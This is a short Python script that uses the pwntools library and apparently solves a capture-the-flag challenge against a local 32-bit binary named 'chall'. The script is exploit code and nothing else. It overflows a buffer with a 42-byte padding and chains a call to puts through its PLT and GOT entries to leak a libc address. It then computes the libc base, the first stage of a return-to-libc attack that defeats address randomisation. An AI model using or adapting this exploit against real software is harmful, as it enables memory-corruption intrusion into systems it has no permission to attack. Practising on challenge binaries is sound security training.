#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *

target = process("./chall")
# elf = ELF("./chall")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# address
puts_plt = 0x08048310
puts_got = 0x0804a010

#pop1ret = 

libc_puts_off = 0x000673d0

# puts_plt = elf.plt["puts"]
# puts_got = elf.got["puts"]

# libc_puts_off = libc.symbols["puts"]

# print("[*] puts plt addr : 0x{:x}".format(puts_plt))
# print("[*] puts got addr : 0x{:x}".format(puts_got))
# print("[*] libc puts offset : 0x{:x}".format(libc_puts_off))

# payload 
payload = b"A" * 42
payload += p32(puts_plt)
payload += b"BBBB"
payload += p32(puts_got)

_ = target.readline()
target.sendline(payload)
_ = target.readline()

libc_puts_addr = u32(target.readline()[0:4])
print("[*] libc_puts_addr : 0x{:x}\n".format(libc_puts_addr))

libc_base_addr = libc_puts_addr - libc_puts_off

print("[*] libc_base_addr : 0x{:x}\n".format(libc_base_addr))

